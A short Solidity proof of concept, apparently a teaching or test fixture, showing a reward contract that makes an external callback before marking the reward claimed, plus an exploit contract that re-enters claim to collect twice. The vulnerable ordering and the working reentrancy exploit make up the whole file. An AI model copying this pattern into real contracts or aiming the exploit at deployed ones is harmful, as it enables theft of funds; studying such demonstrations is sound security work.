// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IRewardReceiver { function onReward() external; }
contract Rewarder { uint256 public reward=100; uint256 public payouts; bool public claimed;
    function claim(address receiver) external { require(!claimed,"claimed");
        // @> external transfer/callback happens before the account reward state is updated
        IRewardReceiver(receiver).onReward(); claimed=true; payouts+=reward; }
}
contract Exploit is IRewardReceiver { Rewarder public rewarder; uint256 public callbacks; bool public harmed; event Proof(uint256 payouts);
    constructor(){ rewarder=new Rewarder(); }
    function run() external { rewarder.claim(address(this)); harmed=rewarder.payouts()==200; emit Proof(rewarder.payouts()); require(harmed,"reentrancy"); }
    function onReward() external { require(msg.sender==address(rewarder)); if(callbacks++==0) rewarder.claim(address(this)); }
}
